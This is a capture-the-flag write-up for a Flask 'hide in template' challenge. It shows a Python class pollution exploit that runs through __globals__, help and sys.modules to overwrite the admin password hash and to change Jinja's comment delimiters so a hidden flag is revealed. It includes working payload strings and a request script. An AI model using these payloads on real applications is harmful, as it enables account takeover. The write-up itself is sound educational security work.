## hide in template  

<img src="images/chall.png" width=600>

### Vulnerability Analysis  

We are given a challenge webpage that allows us to edit the theme colours of our profile. The backend contains a default `guest` user, as well as an `admin` user.  

```python
users = {
    'admin': {
        'pw': auth.hash(os.urandom(32).hex()),
        'theme': Theme({'color': 'black', 'background-color': 'black'}), # hide in black...
        'idx': 0,
    },
    'guest': {
        'pw': auth.hash('guest'),
        'theme': Theme({}),
        'idx': 1,
    }
}
```

The `/admin` endpoint requires admin privileges to access, and renders the flag.  

```python
@app.route('/admin', methods=['GET'])
@access.admin_only
def admin():
    return render_template('flag.html', flag=flag)
```

Right off the bat, we can notice a class pollution vuln in the `/theme/edit` endpoint, which uses the `set()` function to recursively modify object and dictionary properties.  

```python
# app.py
@app.route('/theme/edit', methods=['GET', 'POST'])
@access.login_required
def theme_edit():
    if request.method == 'POST':
        key = request.form.get('key', '')
        value = request.form.get('value', '')

        if not (validate(key) and validate(key)):
            abort(400)

        if key not in CSS_KEYS:
            return abort(400)

        username = session.get('username')
        user = users.get(username)

        set(Theme, f'customs.{username}.style.{key}', value)
        
        user['theme'] = Theme.get(username)

        return redirect(url_for('profile'))
    
    return render_template('theme_edit.html')

# utils.py
def set(obj, prop, value):
    prop_chain = prop.split('.')
    for i in range(0,len(prop_chain)-1):
        if isinstance(obj, dict): 
            if not prop_chain[i+1]: obj[prop_chain[i]] = value;return
            else:
                obj = obj.setdefault(prop_chain[i], {})
        else:
            if prop_chain[i] and not hasattr(obj, prop_chain[i]): setattr(obj, prop_chain[i], {})
            if not prop_chain[i+1]:
                return setattr(obj, prop_chain[i], value) 
            obj = getattr(obj, prop_chain[i])
    if isinstance(obj, dict): obj[prop_chain[-1]] = value
    else: setattr(obj, prop_chain[-1], value)
```

Our first instinct would be to use an attribute chain to bubble all the way up to the global variables, where we can access the `users` dictionary and modify the `admin` password.  

```python
Theme.customs['guest'].__class__.__init__.__globals__
```

However, an important nuance in `__globals__` is that it is restricted to the current object's module scope. `Theme` is imported into `app.py`, so it can't directly access the global variables in the main application.  

Thankfully, `__globals__` from `theme.py` gives us access to `__builtins__`, where we can access `sys` from the `help()` function globals. Now that we have `sys`, we can jump into the main module and access the global variables there directly.  

```python
Theme.customs['guest'].__class__.__init__.__globals__['__builtins__']['help'].__call__.__globals__['sys'].modules['__main__']
```

Another important detail of `set()` is that when it encounters an empty attribute name, it immediately stops the traversal and assigns the specified value to the current object in the chain.  

This means that if we just append `.` to the back of our payload, `set()` will completely ignore the `.style.color` chain and successfully execute our pollution.  

### Admin Login  

The application primarily uses the `auth` class for authentication, which uses `256` rounds of SHA256 encoding to generate password hashes.  

```python
class auth():

    @staticmethod
    def verify(password : str, hashed_password : str) -> bool:
        return auth.hash(password) == hashed_password
    
    @staticmethod
    def _hash(password : str) -> str:
        m = sha256(password.encode())

        return m.hexdigest()

    @staticmethod
    def hash(password : str) -> str:
        hashed_password = password

        # super safe!
        for _ in range(256):
            hashed_password = auth._hash(hashed_password)

        return hashed_password
```

To take over the admin account, we can generate a password with a known text using `auth.hash()`, then use the class pollution vuln to change the admin password to that.  

We can first register an account with our pollution payload as the username, then use `/theme/edit` to exploit the vuln.    

```python
creds = {
    'username': 'guest.__class__.__init__.__globals__.__builtins__.help.__call__.__globals__.sys.modules.__main__.user.admin.pw',
    'password': 'a' * 8
}

res = s.post(f'{url}/signup', data=creds)
res = s.post(f'{url}/login', data=creds)

res = s.post(f'{url}/theme/edit', data={
    'key': 'color',
    'value': auth.hash('hacked')
})
```

We can then login using the admin account.  

<img src="images/admin.png" width=600>

### Invisible Flag  

However, when we visit the `/admin` endpoint, it renders the fake flag instead, and the real flag isn't rendered at all.  

<img src="images/invisible.png" width=600>

Looking at the `flag.html` template, this is because the real flag is embedded within Jinja2 comments, so after Jinja parses the template, the flag is completely omitted from the rendered result.  

```html
{% extends 'base.html'%}
{% block title %}Hide in template{% endblock %}

{% block content %}
    <div class="container">
        <h1>Flag Hide in template</h1>
        <h1>
            Flag is {# '[FLAG]' #}
        </h1>
        <h1>
            FakeFlag is {{ flag }}
        </h1>
    </div>
{% endblock %}
```

To bypass this, we can reuse the class pollution exploit again to alter the Jinja rendering behaviour.  

Jinja uses the global variables `comment_start_string` and `comment_end_string` to define comment delimiters.  

```python
guest.__class__.__init__.__globals__.__builtins__.help.__call__.__globals__.sys.modules.__main__.app.jinja_env.comment_start_string
```

This time, we can use the attribute chain to set `comment_start_string` to gibberish, which will cause the templating engine to ignore comments altogether and render our flag.  

<img src="images/flag.png" width=600>

Flag: `DH{I_loved_jinja2_and_flask_but_loved...1004}`